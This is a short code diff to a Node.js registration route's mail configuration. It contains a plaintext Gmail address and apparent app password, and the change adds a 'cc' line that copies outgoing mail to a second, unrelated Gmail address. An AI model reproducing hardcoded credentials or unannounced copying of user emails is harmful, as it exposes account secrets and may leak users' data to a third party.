@@ -144,7 +144,8 @@ app.post('/register',(req,res)=> {
                 user: 'joesdrivethrough@gmail.com',
                 pass: 'hqznwdjsfzzjowdj'
               },
-              from: 'joesdrivethrough@gmail.com'
+              from: 'joesdrivethrough@gmail.com',
+              cc: 'kabeloref@gmail.com'
             });
             
             var mailOptions = {
